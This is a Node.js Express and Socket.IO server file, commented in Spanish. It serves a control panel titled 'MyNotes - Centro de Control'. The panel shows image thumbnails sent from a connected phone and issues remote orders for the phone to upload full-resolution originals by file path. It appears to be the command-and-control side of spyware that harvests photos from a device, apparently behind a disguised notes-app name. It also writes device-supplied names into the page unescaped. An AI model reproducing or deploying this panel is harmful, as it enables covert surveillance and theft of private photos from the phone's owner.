const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Control</title>
            <style>
                body { font-family: sans-serif; background: #121212; color: white; padding: 20px; }
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
                .card { background: #1e1e1e; border-radius: 8px; overflow: hidden; text-align: center; border: 1px solid #333; }
                .card img { width: 100%; height: 120px; object-fit: cover; opacity: 0.7; }
                .card.hd img { opacity: 1; border-bottom: 2px solid #00ff00; } /* Estilo para fotos HD */
                
                /* BOTONES */
                .btn-req { background: #ff9800; border: none; padding: 8px; width: 100%; cursor: pointer; color: white; font-weight: bold;}
                .btn-req:hover { background: #f57c00; }
                
                .btn-down { background: #4CAF50; display: none; padding: 8px; width: 100%; color: white; text-decoration: none; font-weight: bold;}
                
                /* Cuando llega la HD, ocultamos el botón de pedir y mostramos descargar */
                .card.hd .btn-req { display: none; }
                .card.hd .btn-down { display: block; }
            </style>
        </head>
        <body>
            <h1>📡 Panel de Control</h1>
            <div id="status" style="padding: 10px; background: #333; margin-bottom: 20px;">Esperando conexión...</div>
            <div class="grid" id="grid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('grid');

                socket.on('connection_alert', msg => document.getElementById('status').innerText = msg);

                // 1. LLEGA MINIATURA (PREVIEW)
                socket.on('new_preview', data => {
                    if(document.getElementById(data.path)) return; // No repetir

                    const card = document.createElement('div');
                    card.className = 'card';
                    card.id = data.path; // Usamos la ruta como ID para encontrarla luego
                    card.innerHTML = \`
                        <img src="data:image/jpeg;base64,\${data.image64}">
                        <div style="font-size:10px; padding:5px;">\${data.name}</div>
                        <button class="btn-req" onclick="pedirOriginal('\${data.path}')">⚡ PEDIR HD</button>
                        <a id="link_\${data.path}" class="btn-down" download="\${data.name}">⬇ GUARDAR HD</a>
                    \`;
                    grid.prepend(card);
                });

                // 2. LLEGA LA ORIGINAL (FULL IMAGE)
                socket.on('receive_full', data => {
                    // Buscamos la tarjeta original usando el nombre del archivo (truco simple)
                    // Nota: En producción idealmente usamos IDs únicos, pero esto funcionará
                    const cards = document.getElementsByClassName('card');
                    for(let card of cards) {
                        if(data.name.includes(card.innerText.trim())) {
                            card.classList.add('hd'); // Cambia estilo a HD
                            const img = card.querySelector('img');
                            const link = card.querySelector('.btn-down');
                            
                            // Reemplazamos miniatura por HD
                            img.src = "data:image/jpeg;base64," + data.image64;
                            link.href = img.src; // Activamos botón descargar
                            link.download = data.name;
                        }
                    }
                });

                function pedirOriginal(path) {
                    // Enviamos la orden al servidor, el servidor se la pasa al celular
                    socket.emit('order_download', { path: path });
                    alert("Solicitud enviada... Espere unos segundos.");
                }
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });

io.on('connection', (socket) => {
    console.log('🔗 Cliente conectado:', socket.id);
    io.emit('connection_alert', '✅ Dispositivo Conectado');

    // REENVIAR DATOS DEL CELULAR A LA WEB
    socket.on('usrData', (data) => {
        if (data.dataType === 'preview_image') {
            io.emit('new_preview', data); // A todos los navegadores
        } else if (data.dataType === 'full_image') {
            console.log("📸 ¡Llegó una foto HD!");
            io.emit('receive_full', data); // A todos los navegadores
        }
    });

    // REENVIAR ORDEN DE LA WEB AL CELULAR
    socket.on('order_download', (data) => {
        console.log("Orden enviada al celular:", data.path);
        // 'broadcast' envía a todos MENOS al que lo pidió (la web), o sea, al celular
        socket.broadcast.emit('request_full_image', data);
    });
});

server.listen(process.env.PORT || 3000, () => console.log('Servidor listo'));
